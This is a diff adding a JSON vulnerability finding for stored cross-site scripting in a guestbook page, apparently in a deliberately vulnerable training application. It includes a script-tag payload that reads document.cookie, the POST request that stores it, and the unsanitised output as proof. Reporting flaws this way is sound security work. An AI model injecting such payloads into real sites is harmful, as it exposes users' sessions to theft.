@@ -1,0 +1,10 @@
+{
+  "title": "Cross-Site Scripting (XSS) - Stored (Persistent)",
+  "severity": "High",
+  "location": "/vulnerabilities/xss_s/",
+  "proof": "POST to /vulnerabilities/xss_s/ with txtName=<script>alert(document.cookie)</script>&mtxMessage=testxss resulted in: '<div id=\"guestbook_comments\">Name: <script>alert(document.cookie)</script><br />Message: testxss<br /></div>' - the script tag is stored in the guestbook database and rendered on every page load with no sanitization.",
+  "poc_steps": [
+    "POST /vulnerabilities/xss_s/ with txtName=<script>alert(document.cookie)</script>&mtxMessage=testxss&btnSign=Sign+Guestbook",
+    "Reload /vulnerabilities/xss_s/ - script executes automatically"
+  ]
+}
